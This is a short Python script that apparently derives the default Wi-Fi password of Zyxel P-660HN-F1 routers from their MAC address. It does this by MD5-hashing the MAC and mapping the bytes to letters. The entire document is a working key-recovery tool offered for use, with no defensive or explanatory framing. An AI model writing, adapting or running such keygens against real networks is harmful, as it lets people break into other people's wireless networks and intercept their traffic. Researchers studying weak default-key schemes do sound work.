# works for Zyxel p-660HN-F1
# ESSID : ZyXELDDDDlll
# takes mac in upper case without colons nor offset

import hashlib
import argparse

def p660hn_f1(mac, length):
	md5 = hashlib.md5()
	md5.update(mac.encode())
	digest = md5.digest()

	moduli = []
	for i in digest:
		moduli.append(i % 26)
	key = ""
	for i in moduli:
		key += chr(i + 97)
	print(key[:length])


parser = argparse.ArgumentParser(description='Zyxel p-660HN-F1 Keygen')
parser.add_argument('mac', help='Mac address (upper case without colons or offset)')
parser.add_argument('-length', help='Password length', default=10, type=int)
args = parser.parse_args()

p660hn_f1(args.mac, args.length)
